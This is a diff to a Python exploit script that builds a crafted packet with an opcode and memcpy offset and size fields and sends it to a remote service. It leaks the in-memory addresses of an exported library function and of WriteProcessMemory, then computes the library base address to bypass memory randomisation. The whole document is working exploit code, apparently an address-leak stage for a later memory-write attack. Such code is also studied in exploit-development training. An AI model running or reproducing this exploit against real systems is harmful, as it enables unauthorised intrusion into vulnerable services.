@@ -195,7 +195,18 @@ def leakFunctionAddress(func, socketTup):
     buf = bytearray()
 
     # psAgentCommand
-    buf = func + b"A" * (0x100 - len(func))
+    buf += bytearray([0x41] * 0xC)  # psAgentCommand        0x04 - 0x34
+    buf += pack("<i", 0x2000)  # Opcode                0x10
+    buf += pack("<i", 0x0)  # 1st memcpy: offset    0x14
+    buf += pack("<i", 0x100)  # 1st memcpy: size      0x18
+    buf += pack("<i", 0x100)  # 2nd memcpy: offset    0x1C
+    buf += pack("<i", 0x100)  # 2nd memcpy: size      0x20
+    buf += pack("<i", 0x200)  # 3rd memcpy: offset    0x24
+    buf += pack("<i", 0x100)  # 3rd memcpy: size      0x28
+    buf += bytearray([0x41] * 0x8)  # N/A                   0x2C - 0x34
+
+    # psCommandBuffer
+    buf += func + b"A" * (0x100 - len(func))
     buf += b"B" * 0x100
     buf += b"C" * 0x100
 
@@ -312,22 +323,24 @@ def main():
 
     try:
 
-        symbolOperation = leakFunctionAddress(b"N98E_CRYPTO_get_new_lockid" + b"\x00", (server, port))
+        # Get Addr of ExportFunction
+        exportedFunc = leakFunctionAddress(b"SymbolOperationN98E_CRYPTO_get_new_lockid" + b"\x00", (server, port))
+
+        # Get Addr of WPM
+        WPMAddr = leakFunctionAddress(b"SymbolOperationWriteProcessMemory" + b"\x00", (server, port))
 
         # Target Function Offset observed from loading the dll in IDA was noted
         functionOffset = 0x14E0
 
         # Can use the in memory address and preferred function offset to get
         # the base address of the library
-        if symbolOperation == 1:
+        if exportedFunc == 1:
             print(Fore.RED + "[-] Failed to leak exportedFunction address" + Style.RESET_ALL)
             return 1
-        libraryBase = symbolOperation - functionOffset
-        print(Fore.GREEN + f"o Calculated library base: {str(hex(libraryBase))}" + Style.RESET_ALL)
 
-        # Get Addr of WPM
-        WPMAddr = leakFunctionAddress(b"WriteProcessMemory" + b"\x00", (server, port))
-        print(Fore.GREEN + f"o Leaked WriteProcessMemory address: {hex(WPMAddr)}" + Style.RESET_ALL)
+        libraryBase = exportedFunc - functionOffset
+        print(Fore.GREEN + f"o Calculated library base: {str(hex(libraryBase))}\n" + Style.RESET_ALL)
+        print(Fore.GREEN + f"o Leaked WriteProcessMemory address: {hex(WPMAddr)}\n" + Style.RESET_ALL)
 
         if WPMAddr == 1:
             print(Fore.RED + "[-] Failed to leak WriteProcessMemory address" + Style.RESET_ALL)
